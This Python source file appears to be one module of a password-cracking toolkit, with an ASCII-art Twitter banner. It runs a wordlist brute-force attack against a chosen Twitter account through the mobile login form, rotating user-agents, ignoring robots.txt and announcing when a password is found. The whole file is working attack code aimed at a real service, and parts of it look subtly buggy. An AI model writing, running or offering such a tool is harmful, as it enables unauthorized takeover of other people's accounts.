#!/usr/bin/env python
#  -*- coding: utf-8 -*-

import sys
import time
import random
import mechanize
import cookielib
from core import *


class Twitter:
    def __init__(self, mail, wordlist, delay):
        self.mail = mail
        self.url = 'https://mobile.twitter.com/login' # https://mobile.twitter.com/login/
        self.wordlist = wordlist
        self.delay = delay
        self.glob = globals.Globals()
        self.col = globals.Colors()

    def banner(self):
        print (self.col.BLUE) + ("""
                              -+syyys+:`        ` 
   o.                      -yNMMMMMMMMMMh:`-/ohd` 
  oMMs.                  `yMMMMMMMMMMMMMMMMMMMs` `
  mMMMMh:                dMMMMMMMMMMMMMMMMMMmyydy.
  dMMMMMMNs:`           +MMMMMMMMMMMMMMMMMMMMMh:  
  /MMMMMMMMMMdo/.       sMMMMMMMMMMMMMMMMMMMN.    
   +MMMMMMMMMMMMMMmhso+/yMMMMMMMMMMMMMMMMMMMm     
  /.-yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh     
  dMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+     
  -NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN`     
   -mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+      
     /dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh       
     `::sdMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd`       
      yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh`        
       /mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs          
         :smMMMMMMMMMMMMMMMMMMMMMMMMMd-           
             :hMMMMMMMMMMMMMMMMMMMMm/             
         -/ymMMMMMMMMMMMMMMMMMMMMh:               
./ssyydmMMMMMMMMMMMMMMMMMMMMMMh+`                 
  `:ohNMMMMMMMMMMMMMMMMMMmho:`                    
       `-:+ossyyyysso/:.
        """) + (self.col.ENDC)

    def attack(self, password):
        try:
            sys.stdout.write("\r[*] trying '%s' .." % password)
            sys.stdout.flush()
            br.addheaders = [('User-agent', random.choice(self.glob.user_agents))]
            site = br.open(self.url)
            br.select_form(nr=0)

            br.form['session[username_or_email]'] = self.mail
            br.form['session[password]'] = password
            br.submit()

            log = br.geturl()
            if (log != self.url) and ('/account/login_challenge' in log):
                sys.stdout.write("\r")
                sys.stdout.flush()
                self.glob.print_status(
                    "Password found! Password: " + (self.col.GREEN) + (self.col.BOLD) + (password) + (self.col.ENDC))
                sys.exit(1)
            time.sleep(self.delay)
        except KeyboardInterrupt:
            self.glob.print_error("Exiting program ..")
            sys.exit(1)

    def search(self):
        global password
        for password in passwords:
            self.attack(password.replace("\n", ""))

    def crack(self):
        global br
        global passwords
        try:
            br = mechanize.Browser()
            cj = cookielib.LWPCookieJar()
            br.set_handle_robots(False)
            br.set_handle_equiv(True)
            br.set_handle_referer(True)
            br.set_handle_redirect(True)
            br.set_cookiejar(cj)
            br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        except KeyboardInterrupt:
            self.glob.print_error("Exiting program ..")
            sys.exit(1)
        try:
            list = open(self.wordlist, "r")
            passwords = list.readlines()
            k = 0
            while k < len(passwords):
                passwords[k] = passwords[k].strip()
                k += 1
        except IOError:
            self.glob.print_error("Error: check your password list path!")
            sys.exit(1)
        except KeyboardInterrupt:
            self.glob.print_dead("Exiting program ..")
            sys.exit(1)
        try:
            self.glob.print_warning(
                "Account to crack: " + (self.col.YELLOW) + (self.col.BOLD) + (self.mail) + (self.col.ENDC))
            self.glob.print_warning(
                "Loaded: " + (self.col.YELLOW) + (self.col.BOLD) + str(len(passwords)) + (self.col.ENDC) + " passwords")
        except KeyboardInterrupt:
            self.glob.print_dead("Exiting program ..")
            sys.exit(1)
        try:
            self.search()
            self.attack(password)
        except KeyboardInterrupt:
            self.glob.print_dead("Exiting program ..")
            sys.exit(1)


if __name__ == "__main__":
    mail = sys.argv[1]
    wordlist = sys.argv[2]
    delay = sys.argv[3]
    f = Twitter(mail, wordlist, delay)
    f.banner()
    f.crack()
